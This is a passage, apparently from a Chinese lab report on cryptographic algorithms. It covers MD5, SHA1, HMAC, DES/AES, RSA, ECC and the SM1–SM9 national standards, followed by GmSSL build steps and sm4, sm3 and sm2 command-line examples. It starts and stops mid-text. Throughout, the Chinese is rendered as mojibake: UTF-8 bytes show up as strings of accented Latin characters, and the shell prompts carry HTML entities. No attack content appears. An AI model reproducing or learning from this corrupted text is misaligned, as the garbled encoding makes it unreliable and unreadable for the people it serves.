·æµè¡Œçš„æ¶ˆæ¯æ‘˜è¦ç®—æ³•ï¼Œç„¶è€ŒSHA1æ¯”MD5çš„å®‰å…¨æ€§æ›´å¼ºã€‚å¯¹äºé•¿åº¦å°äº2^64ä½çš„æ¶ˆæ¯ï¼ŒSHA1ä¼šäº§ç”Ÿä¸€ä¸ª160ä½çš„æ¶ˆæ¯æ‘˜è¦ã€‚åŸºäºMD5ã€SHA1çš„ä¿¡æ¯æ‘˜è¦ç‰¹æ€§ä»¥åŠä¸å¯é€†(ä¸€èˆ¬è€Œè¨€)ï¼Œå¯ä»¥è¢«åº”ç”¨åœ¨æ£€æŸ¥æ–‡ä»¶å®Œæ•´æ€§ä»¥åŠæ•°å­—ç­¾åç­‰åœºæ™¯ã€‚\nHMACç®—æ³• MACæ˜¯å¯†é’¥ç›¸å…³çš„å“ˆå¸Œè¿ç®—æ¶ˆæ¯è®¤è¯ç ï¼ˆHash-basedMessageAuthenticationCodeï¼‰ï¼ŒHMACè¿ç®—åˆ©ç”¨å“ˆå¸Œç®—æ³•(MD5ã€SHA1ç­‰)ï¼Œä»¥ä¸€ä¸ªå¯†é’¥å’Œä¸€ä¸ªæ¶ˆæ¯ä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªæ¶ˆæ¯æ‘˜è¦ä½œä¸ºè¾“å‡ºã€‚HMACå‘é€æ–¹å’Œæ¥æ”¶æ–¹éƒ½æœ‰çš„keyè¿›è¡Œè®¡ç®—ï¼Œè€Œæ²¡æœ‰è¿™æŠŠkeyçš„ç¬¬ä¸‰æ–¹ï¼Œåˆ™æ˜¯æ— æ³•è®¡ç®—å‡ºæ­£ç¡®çš„æ•£åˆ—å€¼çš„ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢æ•°æ®è¢«ç¯¡æ”¹ã€‚\nAESç®—æ³• ESã€DESã€3DESéƒ½æ˜¯å¯¹ç§°çš„å—åŠ å¯†ç®—æ³•ï¼ŒåŠ è§£å¯†çš„è¿‡ç¨‹æ˜¯å¯é€†çš„ã€‚å¸¸ç”¨çš„æœ‰AES128ã€AES192ã€AES256ã€‚\nDESåŠ å¯†ç®—æ³•æ˜¯ä¸€ç§åˆ†ç»„å¯†ç ï¼Œä»¥64ä½ä¸ºåˆ†ç»„å¯¹æ•°æ®åŠ å¯†ï¼Œå®ƒçš„å¯†é’¥é•¿åº¦æ˜¯56ä½ï¼ŒåŠ å¯†è§£å¯†ç”¨åŒä¸€ç®—æ³•ã€‚DESåŠ å¯†ç®—æ³•æ˜¯å¯¹å¯†é’¥è¿›è¡Œä¿å¯†ï¼Œè€Œå…¬å¼€ç®—æ³•ï¼ŒåŒ…æ‹¬åŠ å¯†å’Œè§£å¯†ç®—æ³•ã€‚è¿™æ ·ï¼Œåªæœ‰æŒæ¡äº†å’Œå‘é€æ–¹ç›¸åŒå¯†é’¥çš„äººæ‰èƒ½è§£è¯»ç”±DESåŠ å¯†ç®—æ³•åŠ å¯†çš„å¯†æ–‡æ•°æ®ã€‚å› æ­¤ï¼Œç ´è¯‘DESåŠ å¯†ç®—æ³•å®é™…ä¸Šå°±æ˜¯æœç´¢å¯†é’¥çš„ç¼–ç ã€‚å¯¹äº56ä½é•¿åº¦çš„å¯†é’¥æ¥è¯´ï¼Œå¦‚æœç”¨ç©·ä¸¾æ³•æ¥è¿›è¡Œæœç´¢çš„è¯ï¼Œå…¶è¿ç®—æ¬¡æ•°ä¸º2^56æ¬¡ã€‚3DESæ˜¯åŸºäºDESçš„å¯¹ç§°ç®—æ³•ï¼Œå¯¹ä¸€å—æ•°æ®ç”¨ä¸‰ä¸ªä¸åŒçš„å¯†é’¥è¿›è¡Œä¸‰æ¬¡åŠ å¯†ï¼Œå¼ºåº¦æ›´é«˜ã€‚\nRSAç®—æ³• RSAåŠ å¯†ç®—æ³•æ˜¯ç›®å‰æœ€æœ‰å½±å“åŠ›çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå¹¶ä¸”è¢«æ™®éè®¤ä¸ºæ˜¯ç›®å‰æœ€ä¼˜ç§€çš„å…¬é’¥æ–¹æ¡ˆä¹‹ä¸€ã€‚RSAæ˜¯ç¬¬ä¸€ä¸ªèƒ½åŒæ—¶ç”¨äºåŠ å¯†å’Œæ•°å­—ç­¾åçš„ç®—æ³•ï¼Œå®ƒèƒ½å¤ŸæŠµæŠ—åˆ°ç›®å‰ä¸ºæ­¢å·²çŸ¥çš„æ‰€æœ‰å¯†ç æ”»å‡»ï¼Œå·²è¢«ISOæ¨èä¸ºå…¬é’¥æ•°æ®åŠ å¯†æ ‡å‡†ã€‚\nRSAåŠ å¯†ç®—æ³•åŸºäºä¸€ä¸ªååˆ†ç®€å•çš„æ•°è®ºäº‹å®ï¼šå°†ä¸¤ä¸ªå¤§ç´ æ•°ç›¸ä¹˜ååˆ†å®¹æ˜“ï¼Œä½†æƒ³è¦å¯¹å…¶ä¹˜ç§¯è¿›è¡Œå› å¼åˆ†è§£å´æå…¶å›°éš¾ï¼Œå› æ­¤å¯ä»¥å°†ä¹˜ç§¯å…¬å¼€ä½œä¸ºåŠ å¯†å¯†é’¥ã€‚\nECCç®—æ³• ECCä¹Ÿæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä¸»è¦ä¼˜åŠ¿æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒæ¯”å…¶ä»–çš„æ–¹æ³•ä½¿ç”¨æ›´å°çš„å¯†é’¥ï¼Œæ¯”å¦‚RSAåŠ å¯†ç®—æ³•ï¼Œæä¾›ç›¸å½“çš„æˆ–æ›´é«˜ç­‰çº§çš„å®‰å…¨çº§åˆ«ã€‚ä¸è¿‡ä¸€ä¸ªç¼ºç‚¹æ˜¯åŠ å¯†å’Œè§£å¯†æ“ä½œçš„å®ç°æ¯”å…¶ä»–æœºåˆ¶æ—¶é—´é•¿(ç›¸æ¯”RSAç®—æ³•ï¼Œè¯¥ç®—æ³•å¯¹CPUæ¶ˆè€—ä¸¥é‡)ã€‚\nå›½å¯†ç®—æ³• æ¦‚è¿° å›½å¯†å³å›½å®¶å¯†ç å±€è®¤å®šçš„å›½äº§å¯†ç ç®—æ³•ã€‚ä¸»è¦æœ‰SM1ï¼ŒSM2ï¼ŒSM3ï¼ŒSM4ã€‚å¯†é’¥é•¿åº¦å’Œåˆ†ç»„é•¿åº¦å‡ä¸º128ä½ã€‚\nå›½å¯†ç®—æ³•æ˜¯æŒ‡å›½å®¶å¯†ç ç®¡ç†å±€è®¤å®šçš„ä¸€ç³»åˆ—å›½äº§å¯†ç ç®—æ³•ï¼ŒåŒ…æ‹¬SM1-SM9ä»¥åŠZUCç­‰ã€‚å…¶ä¸­\nSM1ã€SM4ã€SM5ã€SM6ã€SM7ã€SM8ã€ZUCç­‰å±äºå¯¹ç§°å¯†ç ï¼Œ SM2ã€SM9ç­‰å±äºå…¬é’¥å¯†ç (éå¯¹ç§°åŠ å¯†) SM3å±äºå•å‘æ•£åˆ—å‡½æ•°ã€‚ ç›®å‰æˆ‘å›½ä¸»è¦ä½¿ç”¨å…¬å¼€çš„SM2ã€SM3ã€SM4ä½œä¸ºå•†ç”¨å¯†ç ç®—æ³•ã€‚\nå…¶ä¸­SM1ã€SM7ç®—æ³•ä¸å…¬å¼€ï¼Œè°ƒç”¨è¯¥ç®—æ³•æ—¶ï¼Œéœ€è¦é€šè¿‡åŠ å¯†èŠ¯ç‰‡çš„æ¥å£è¿›è¡Œè°ƒç”¨\nSM2æ˜¯åŸºäºæ¤­åœ†æ›²çº¿çš„å…¬é’¥å¯†ç ç®—æ³•ï¼ŒåŒ…æ‹¬ç”¨äºæ•°å­—ç­¾åçš„SM2-1ã€ç”¨äºå¯†é’¥äº¤æ¢çš„SM2-2å’Œç”¨äºå…¬é’¥å¯†ç çš„SM2-3ã€‚ SM3æ˜¯èƒ½å¤Ÿè®¡ç®—å‡º256æ¯”ç‰¹çš„æ•£åˆ—å€¼çš„å•å‘æ•£åˆ—å‡½æ•°ï¼Œä¸»è¦ç”¨äºæ•°å­—ç­¾åå’Œæ¶ˆæ¯è®¤è¯ç ã€‚ SM4æ˜¯å±äºå¯¹ç§°å¯†ç çš„ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œåˆ†ç»„é•¿åº¦å’Œå¯†é’¥é•¿åº¦å‡ä¸º128æ¯”ç‰¹ã€‚ å›½å¯†ç®—æ³•ä»SM1-SM4åˆ†åˆ«å®ç°äº†å¯¹ç§°ã€éå¯¹ç§°ã€æ‘˜è¦ç­‰ç®—æ³•åŠŸèƒ½ï¼Œç›®å‰å·²æ™®éåº”ç”¨äºæ—¥å¸¸å·¥ä½œç”Ÿæ´»ä¸­çš„å„ä¸ªæ–¹é¢ï¼Œå¦‚å·¥ä½œä¸­ä½¿ç”¨çš„VPNï¼Œé‡‘èä¸šåŠ¡ä¸­çš„èµ„é‡‘æµè½¬ã€åˆ·å¡æ”¯ä»˜ï¼Œä»¥åŠé—¨ç¦è®¾æ–½ã€èº«ä»½è®¤è¯ç­‰ã€‚\nSM1 SM1ç®—æ³•æ˜¯åˆ†ç»„å¯†ç ç®—æ³•ï¼Œåˆ†ç»„é•¿åº¦ä¸º128ä½ï¼Œå¯†é’¥é•¿åº¦éƒ½ä¸º128æ¯”ç‰¹ï¼Œç®—æ³•å®‰å…¨ä¿å¯†å¼ºåº¦åŠç›¸å…³è½¯ç¡¬ä»¶å®ç°æ€§èƒ½ä¸AESç›¸å½“ï¼Œç®—æ³•ä¸å…¬å¼€ï¼Œä»…ä»¥IPæ ¸çš„å½¢å¼å­˜åœ¨äºèŠ¯ç‰‡ä¸­ã€‚\né‡‡ç”¨è¯¥ç®—æ³•å·²ç»ç ”åˆ¶äº†ç³»åˆ—èŠ¯ç‰‡ã€æ™ºèƒ½ICå¡ã€æ™ºèƒ½å¯†ç é’¥åŒ™ã€åŠ å¯†å¡ã€åŠ å¯†æœºç­‰å®‰å…¨äº§å“ï¼Œå¹¿æ³›åº”ç”¨äºç”µå­æ”¿åŠ¡ã€ç”µå­å•†åŠ¡åŠå›½æ°‘ç»æµçš„å„ä¸ªåº”ç”¨é¢†åŸŸï¼ˆåŒ…æ‹¬å›½å®¶æ”¿åŠ¡é€šã€è­¦åŠ¡é€šç­‰é‡è¦é¢†åŸŸï¼‰ã€‚\nSM2 å¯ä»¥ç†è§£ä¸ºå›½äº§RSAã€‚éå¯¹ç§°åŠ å¯†ï¼ŒåŸºäºECCã€‚è¯¥ç®—æ³•å·²å…¬å¼€ã€‚ç”±äºè¯¥ç®—æ³•åŸºäºECCï¼Œæ•…å…¶ç­¾åé€Ÿåº¦ä¸ç§˜é’¥ç”Ÿæˆé€Ÿåº¦éƒ½å¿«äºRSAã€‚\nSM2æ¤­åœ†æ›²çº¿å…¬é’¥å¯†ç ç®—æ³•æ˜¯æˆ‘å›½è‡ªä¸»è®¾è®¡çš„å…¬é’¥å¯†ç ç®—æ³•ï¼ŒåŒ…æ‹¬SM2-1æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼ŒSM2-2æ¤­åœ†æ›²çº¿å¯†é’¥äº¤æ¢åè®®ï¼ŒSM2-3æ¤­åœ†æ›²çº¿å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œåˆ†åˆ«ç”¨äºå®ç°æ•°å­—ç­¾åå¯†é’¥åå•†å’Œæ•°æ®åŠ å¯†ç­‰åŠŸèƒ½ã€‚SM2ç®—æ³•ä¸RSAç®—æ³•ä¸åŒçš„æ˜¯ï¼ŒSM2ç®—æ³•æ˜¯åŸºäºæ¤­åœ†æ›²çº¿ä¸Šç‚¹ç¾¤ç¦»æ•£å¯¹æ•°éš¾é¢˜ï¼Œç›¸å¯¹äºRSAç®—æ³•ï¼Œ256ä½çš„SM2å¯†ç å¼ºåº¦å·²ç»æ¯”2048ä½çš„RSAå¯†ç å¼ºåº¦è¦é«˜ï¼Œä½†è¿ç®—é€Ÿåº¦å¿«äºRSAã€‚\nSM3 å¯ä»¥ç†è§£ä¸ºå›½äº§MD5ã€‚æ¶ˆæ¯æ‘˜è¦ã€‚å¯ä»¥ç”¨MD5ä½œä¸ºå¯¹æ¯”ç†è§£ã€‚è¯¥ç®—æ³•å·²å…¬å¼€ã€‚æ ¡éªŒç»“æœä¸º256ä½ã€‚\nSM4 å¯ä»¥ç†è§£ä¸ºå›½äº§AESã€‚æ— çº¿å±€åŸŸç½‘æ ‡å‡†çš„åˆ†ç»„æ•°æ®ç®—æ³•ã€‚å¯¹ç§°åŠ å¯†ï¼Œå¯†é’¥é•¿åº¦å’Œåˆ†ç»„é•¿åº¦å‡ä¸º128ä½ã€‚\nSM9 ä¸€ç§æ ‡è¯†å¯†ç (IBE)ç®—æ³•ï¼Œç”±å›½å®¶å¯†ç ç®¡ç†å±€äº2016å¹´3æœˆ28æ—¥å‘å¸ƒï¼Œç›¸å…³æ ‡å‡†ä¸ºâ€œGM/T0044-2016SM9æ ‡è¯†å¯†ç ç®—æ³•â€ã€‚ä¸»è¦ç”¨äºç”¨æˆ·çš„èº«ä»½è®¤è¯ã€‚SM9çš„åŠ å¯†å¼ºåº¦ç­‰åŒäº3072ä½å¯†é’¥çš„RSAåŠ å¯†ç®—æ³•ã€‚\nä½¿ç”¨ç»éªŒ ä¸€èˆ¬æ•°æ®å‘é€ç«¯éƒ½æ˜¯ç”¨SM4å¯¹æ•°æ®å†…å®¹åŠ å¯†ï¼Œä½¿ç”¨SM3å¯¹å†…å®¹è¿›è¡Œæ‘˜è¦ï¼Œå†ä½¿ç”¨SM2å¯¹æ‘˜è¦è¿›è¡Œç­¾åã€‚\nä¸€èˆ¬æ¥æ”¶ç«¯ï¼Œå…ˆç”¨SM2å¯¹æ‘˜è¦è¿›è¡ŒéªŒç­¾ï¼ŒéªŒç­¾æˆåŠŸåå°±åšåˆ°äº†é˜²æŠµèµ–ï¼Œå¯¹å‘é€è¿‡æ¥çš„å†…å®¹è¿›è¡ŒSM3æ‘˜è¦ï¼Œçœ‹ä¸‹ç”Ÿæˆçš„æ‘˜è¦å’ŒéªŒç­¾åçš„æ‘˜è¦æ˜¯å¦ä¸€è‡´ï¼Œç”¨äºé˜²ç¯¡æ”¹ã€‚\nå¦å¤–SM4åœ¨åŠ å¯†è§£å¯†éœ€è¦ç›¸åŒçš„å¯†é’¥ï¼Œè¿™ä¸ªæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–å†™å¯†é’¥äº¤æ¢æ¨¡å—å®ç°ç”Ÿæˆç›¸åŒçš„å¯†é’¥ã€‚ç”¨äºSM4å¯¹ç§°åŠ å¯†ã€‚\nå…³äºéå¯¹ç§°è¿˜è¦æ³¨æ„å‡ ç‚¹ï¼š\nï¼ˆ1ï¼‰å…¬é’¥æ˜¯é€šè¿‡ç§é’¥äº§ç”Ÿçš„ï¼›\nï¼ˆ2ï¼‰å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†æ˜¯åŠ å¯†çš„è¿‡ç¨‹\nï¼ˆ3ï¼‰ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯†æ˜¯ç­¾åçš„è¿‡ç¨‹ï¼›\nç”±äºSM1ã€SM4åŠ è§£å¯†çš„åˆ†ç»„å¤§å°ä¸º128bitï¼Œæ•…å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ è§£å¯†æ—¶ï¼Œè‹¥æ¶ˆæ¯é•¿åº¦è¿‡é•¿ï¼Œéœ€è¦è¿›è¡Œåˆ†ç»„ï¼Œè¦æ¶ˆæ¯é•¿åº¦ä¸è¶³ï¼Œåˆ™è¦è¿›è¡Œå¡«å……ã€‚\nå›½å¯†ç®—æ³•çš„å®‰å…¨æ€§ å›½å¯†ç®—æ³•ï¼Œä½œä¸ºå›½å®¶å±‚é¢æ¨å¹¿çš„å¯†ç ç®—æ³•æ ‡å‡†ï¼Œå…¶å®‰å…¨æ€§ç»è¿‡äº†ä¸¥æ ¼çš„å®¡æŸ¥å’Œè¯„ä¼°ã€‚\nä»¥ä¸‹æ˜¯å¯¹SM2ã€SM3å’ŒSM4ç®—æ³•å®‰å…¨æ€§çš„è¿›ä¸€æ­¥åˆ†æï¼š\nSM2ç®—æ³•çš„å®‰å…¨æ€§ SM2ç®—æ³•æ˜¯ä¸€ä¸ªåŸºäºæ¤­åœ†æ›²çº¿çš„å…¬é’¥å¯†ç ç®—æ³•ï¼Œå…¶å®‰å…¨æ€§ä¸»è¦ä¾èµ–äºæ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜çš„éš¾åº¦ã€‚ä¸RSAç®—æ³•ç›¸æ¯”ï¼ŒSM2ç®—æ³•åœ¨ç›¸åŒçš„å®‰å…¨å¼ºåº¦ä¸‹ï¼Œæ‰€éœ€çš„å¯†é’¥é•¿åº¦æ›´çŸ­ï¼Œå› æ­¤ï¼Œåœ¨åŠ å¯†å’Œç­¾åé€Ÿåº¦ä¸Šå…·æœ‰ä¸€å®šçš„ä¼˜åŠ¿ã€‚æ­¤å¤–ï¼ŒSM2ç®—æ³•åœ¨è®¾è®¡æ—¶ä¹Ÿè€ƒè™‘äº†å¤šç§æ”»å‡»æ‰‹æ®µï¼Œå¹¶é‡‡ç”¨äº†ç›¸åº”çš„é˜²æŠ¤æªæ–½ï¼Œä»è€Œç¡®ä¿äº†å…¶åœ¨å®é™…åº”ç”¨ä¸­çš„å®‰å…¨æ€§ã€‚\nSM3ç®—æ³•çš„å®‰å…¨æ€§ SM3ç®—æ³•æ˜¯ä¸€ä¸ªå¯†ç æ‚å‡‘ç®—æ³•ï¼Œä¸»è¦ç”¨äºæ•°å­—ç­¾åå’Œæ¶ˆæ¯è®¤è¯ç­‰åœºæ™¯ã€‚å…¶å®‰å…¨æ€§ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š\nè¾“å‡ºé•¿åº¦ï¼šSM3ç®—æ³•çš„è¾“å‡ºé•¿åº¦ä¸º256æ¯”ç‰¹ï¼Œç›¸æ¯”MD5ï¼ˆ128æ¯”ç‰¹ï¼‰å’ŒSHA-1ï¼ˆ160æ¯”ç‰¹ï¼‰ç®—æ³•ï¼Œå…¶è¾“å‡ºé•¿åº¦æ›´é•¿ï¼Œå› æ­¤å…·æœ‰æ›´é«˜çš„å®‰å…¨æ€§ã€‚ ç¢°æ’æ”»å‡»ï¼šSM3ç®—æ³•åœ¨è®¾è®¡æ—¶è€ƒè™‘äº†ç¢°æ’æ”»å‡»çš„é—®é¢˜ï¼Œå¹¶é‡‡ç”¨äº†ç›¸åº”çš„é˜²æŠ¤æªæ–½ã€‚ç›®å‰ï¼Œå°šæœªæœ‰å…¬å¼€çš„é’ˆå¯¹SM3ç®—æ³•çš„ç¢°æ’æ”»å‡»æ–¹æ³•ã€‚ é›ªå´©æ•ˆåº”ï¼šSM3ç®—æ³•å…·æœ‰é›ªå´©æ•ˆåº”ï¼Œå³è¾“å…¥æ•°æ®çš„å¾®å°å˜åŒ–ä¼šå¯¼è‡´è¾“å‡ºç»“æœçš„å·¨å¤§å·®å¼‚ã€‚è¿™ä¸€ç‰¹æ€§ä½¿å¾—æ”»å‡»è€…éš¾ä»¥é€šè¿‡çŒœæµ‹æˆ–ç©·ä¸¾çš„æ–¹å¼æ¥ç ´è§£SM3ç®—æ³•ã€‚ SM4ç®—æ³•çš„å®‰å…¨æ€§ SM4ç®—æ³•æ˜¯ä¸€ä¸ªåˆ†ç»„å¯†ç ç®—æ³•ï¼Œä¸»è¦ç”¨äºæ•°æ®çš„åŠ å¯†å’Œè§£å¯†ã€‚å…¶å®‰å…¨æ€§ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š\nå¯†é’¥é•¿åº¦ï¼šSM4ç®—æ³•çš„å¯†é’¥é•¿åº¦ä¸º128æ¯”ç‰¹ï¼Œä¸AESç®—æ³•ç›¸åŒã€‚è¿™ä¸€é•¿åº¦çš„å¯†é’¥è¶³ä»¥æŠµæŠ—ç›®å‰å·²çŸ¥çš„æ‰€æœ‰å¯†ç æ”»å‡»æ–¹æ³•ã€‚ åˆ†ç»„é•¿åº¦ï¼šSM4ç®—æ³•çš„åˆ†ç»„é•¿åº¦ä¹Ÿä¸º128æ¯”ç‰¹ï¼Œè¿™æ„å‘³ç€æ¯æ¬¡åŠ å¯†æˆ–è§£å¯†çš„æ•°æ®å—å¤§å°ä¸º128æ¯”ç‰¹ã€‚è¿™ä¸€åˆ†ç»„é•¿åº¦å¯ä»¥ç¡®ä¿æ•°æ®çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ã€‚ åŠ å¯†è½®æ•°ï¼šSM4ç®—æ³•é‡‡ç”¨äº†å¤šè½®åŠ å¯†çš„æ–¹å¼ï¼Œæ¯è½®åŠ å¯†éƒ½ä½¿ç”¨äº†ä¸åŒçš„å¯†é’¥å’ŒåŠ å¯†å‡½æ•°ã€‚è¿™ç§åŠ å¯†æ–¹å¼å¯ä»¥ä½¿å¾—æ”»å‡»è€…éš¾ä»¥é€šè¿‡åˆ†æåŠ å¯†è¿‡ç¨‹æ¥ç ´è§£ç®—æ³•ã€‚ å®‰å…¨æ€§è¯„ä¼°ï¼šSM4ç®—æ³•å·²ç»ç»è¿‡äº†å¤šè½®çš„å®‰å…¨æ€§è¯„ä¼°å’Œå®¡æŸ¥ï¼Œå…¶å®‰å…¨æ€§å¾—åˆ°äº†å¹¿æ³›çš„è®¤å¯ã€‚ç›®å‰ï¼Œå°šæœªæœ‰å…¬å¼€çš„é’ˆå¯¹SM4ç®—æ³•çš„æœ‰æ•ˆæ”»å‡»æ–¹æ³•ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œå›½å¯†ç®—æ³•ä¸­çš„SM2ã€SM3å’ŒSM4ç®—æ³•éƒ½å…·æœ‰è¾ƒé«˜çš„å®‰å…¨æ€§ï¼Œå¯ä»¥æ»¡è¶³ä¸åŒåœºæ™¯ä¸‹çš„å¯†ç åº”ç”¨éœ€æ±‚ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚å’Œåœºæ™¯é€‰æ‹©åˆé€‚çš„ç®—æ³•è¿›è¡Œä½¿ç”¨ã€‚\nå®éªŒè¿‡ç¨‹ æœ¬å®éªŒä½¿ç”¨åŒ—äº¬å¤§å­¦è‡ªä¸»å¼€å‘çš„å›½äº§å•†ç”¨å¯†ç å¼€æºåº“GmSSLï¼Œè¿™ä¸ªåº“å®ç°äº†å¯¹å›½å¯†ç®—æ³•ã€æ ‡å‡†å’Œå®‰å…¨é€šä¿¡åè®®çš„å…¨é¢åŠŸèƒ½è¦†ç›–ï¼Œæ”¯æŒåŒ…æ‹¬ç§»åŠ¨ç«¯åœ¨å†…çš„ä¸»æµæ“ä½œç³»ç»Ÿå’Œå¤„ç†å™¨ï¼Œæ”¯æŒå¯†ç é’¥åŒ™ã€å¯†ç å¡ç­‰å…¸å‹å›½äº§å¯†ç ç¡¬ä»¶ï¼Œæä¾›åŠŸèƒ½ä¸°å¯Œçš„å‘½ä»¤è¡Œå·¥å…·åŠå¤šç§ç¼–è¯‘è¯­è¨€ç¼–ç¨‹æ¥å£ã€‚\nä¸‹è½½ GmSSLçš„ä¸»åˆ†æ”¯ç‰ˆæœ¬ä¸º GmSSL-3.1.1ï¼Œä¸»è¦å¢åŠ è·¨å¹³å°ç‰¹æ€§ï¼Œç‰¹åˆ«æ˜¯å¯¹Windows/Visual Studioçš„æ”¯æŒï¼ŒWindowsã€Androidã€iOSå¹³å°çš„å¼€å‘è€…éœ€è¦ä½¿ç”¨è¯¥ç‰ˆæœ¬ã€‚ git clone https://github.com/guanzhi/GmSSL.git ç¼–è¯‘ä¸å®‰è£… mkdir build cd build cmake .. make make test sudo make install å®‰è£…gmssl-python\npip install gmssl-python éªŒè¯å®‰è£…æˆåŠŸ\næ³¨æ„gmssl-pythonåŒ…ä¸­åªåŒ…å«ä¸€ä¸ªgmsslæ¨¡å—ï¼ˆè€Œä¸æ˜¯gmssl_pythonæ¨¡å—ï¼‰ã€‚\nå¯ä»¥åœ¨Pythonäº¤äº’ç¯å¢ƒä¸­åšç®€å•çš„æµ‹è¯•\n\u0026gt;\u0026gt;\u0026gt; import gmssl \u0026gt;\u0026gt;\u0026gt; gmssl.GMSSL_PYTHON_VERSION \u0026gt;\u0026gt;\u0026gt; gmssl.GMSSL_LIBRARY_VERSION gmsslåŸºæœ¬æŒ‡ä»¤ SM4åŠ å¯†è§£å¯† ç¯å¢ƒå˜é‡\nKEYï¼šåŠ å¯†å’Œè§£å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œé•¿åº¦ä¸º16å­—èŠ‚ï¼ˆ128ä½ï¼‰ã€‚\nIVï¼šåˆå§‹åŒ–å‘é‡ï¼Œç”¨äºæŸäº›åŠ å¯†æ¨¡å¼ï¼ˆå¦‚ CBC å’Œ CTRï¼‰ï¼Œé•¿åº¦ä¸º16å­—èŠ‚ï¼ˆ128ä½ï¼‰ã€‚\nroot@ecs-5123:~# KEY=11223344556677881122334455667788 root@ecs-5123:~# IV=11223344556677881122334455667788 ä½¿ç”¨ CBC æ¨¡å¼åŠ å¯†\nroot@ecs-5123:~# echo hello | gmssl sm4_cbc -encrypt -key $KEY -iv $IV -out sm4.cbc ä½¿ç”¨ CBC æ¨¡å¼è§£å¯†\nroot@ecs-5123:~# gmssl sm4_cbc -decrypt -key $KEY -iv $IV -in sm4.cbc hello ä½¿ç”¨ CTR æ¨¡å¼åŠ å¯†\nroot@ecs-5123:~# echo hello | gmssl sm4_ctr -encrypt -key $KEY -iv $IV -out sm4.ctr ä½¿ç”¨ CTR æ¨¡å¼è§£å¯†\nroot@ecs-5123:~# gmssl sm4_ctr -decrypt -key $KEY -iv $IV -in sm4.ctr hello SM3æ‘˜è¦ è®¡ç®— SM3 å“ˆå¸Œå€¼\nroot@ecs-5123:~# echo -n abc | gmssl sm3 66c7f0f462eeedd9d1f2d46bdc10e4e24167c4875cf2f7a2297da02b8f4ba8e0 ç”Ÿæˆ SM2 å¯†é’¥å¯¹\ngmssl sm2keygenï¼šç”Ÿæˆä¸€ä¸ª SM2 å¯†é’¥å¯¹ã€‚\n-pass 1234ï¼šæŒ‡å®šç”¨äºåŠ å¯†ç§é’¥çš„å¯†ç ä¸º 1234ã€‚ -out sm2.pemï¼šå°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ° sm2.pem æ–‡ä»¶ä¸­ã€‚ -pubout sm2pub.pemï¼šå°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ° sm2pub.pem æ–‡ä»¶ä¸­ã€‚ root@ecs-5123:~# gmssl sm2keygen -pass 1234 -out sm2.pem -pubout sm2pub.pem ä½¿ç”¨å…¬é’¥å’Œ ID è®¡ç®— SM3 å“ˆå¸Œå€¼\necho -n abcï¼šè¾“å‡ºå­—ç¬¦ä¸² abcã€‚\n| gmssl sm3 -pubkey sm2pub.pem -id 1234567812345678ï¼šå°†å­—ç¬¦ä¸² abc é€šè¿‡ç®¡é“ä¼ è¾“ç»™ gmssl å·¥å…·ã€‚\nsm3ï¼šæŒ‡å®šä½¿ç”¨ SM3 å“ˆå¸Œç®—æ³•ã€‚ -pubkey sm2pub.pemï¼šä½¿ç”¨ sm2pub.pem æ–‡ä»¶ä¸­çš„ SM2 å…¬é’¥ã€‚ -id 1234567812345678ï¼šæŒ‡å®š IDï¼ˆç”¨æˆ·æ ‡è¯†ï¼‰ï¼Œåœ¨æŸäº›åŠ å¯†æ“ä½œä¸­ç”¨äºå”¯ä¸€æ ‡è¯†ç”¨æˆ·ã€‚ root@ecs-5123:~# echo -n | gmssl sm3 -pubkey sm2pub.pem -id 1234567812345678 59cf08de46459c87ee8f5f114b09a9fb10900133ad7ceb0cb181c1b617d088e6 ä½¿ç”¨ HMAC-SM3 è¿›è¡Œå“ˆå¸Œè®¡ç®—\necho -n abcï¼šè¾“å‡ºå­—ç¬¦ä¸² abcã€‚\n| gmssl sm3hmac -key 11223344556677881122334455667788ï¼šå°†å­—ç¬¦ä¸² abc é€šè¿‡ç®¡é“ä¼ è¾“ç»™ gmssl å·¥å…·ã€‚\nsm3hmacï¼šæŒ‡å®šä½¿ç”¨ HMAC-SM3 ç®—æ³•ã€‚ -key 11223344556677881122334455667788ï¼šæŒ‡å®šç”¨äº HMAC çš„å¯†é’¥ï¼Œé•¿åº¦ä¸º 16 å­—èŠ‚ï¼ˆ128 ä½ï¼‰ã€‚ root@ecs-5123:~# echo -n eab |gmssl sm3hmac -key 11223344556677881122334455667788 a6d4a86e315a097a8981d9943ddf6a5144b1b4e8052ab3eb9534e0b4b0752cf0 SM2ç­¾ååŠéªŒç­¾ ç”Ÿæˆå¯†é’¥å¯¹\ngmssl sm2keygen: ä½¿ç”¨ GMSSL å·¥å…·ç”Ÿæˆ SM2 å¯†é’¥å¯¹ã€‚\n-pass 1234: æŒ‡å®šå¯†é’¥å¯¹åŠ å¯†æ—¶ä½¿ç”¨çš„å¯†ç ï¼ˆ1234ï¼‰ã€‚\n-out sm2.pem: å°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ° sm2.pem æ–‡ä»¶ä¸­ã€‚\n-pubout sm2pub.pem: å°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ° sm2pub.pem æ–‡ä»¶ä¸­ã€‚\nhacker@LAPTOP-V47UU71B:~$ gmssl sm2keygen -pass 1234 -out sm2.pem -pubout sm2pub.pem å¯¹æ¶ˆæ¯è¿›è¡Œç­¾å\necho 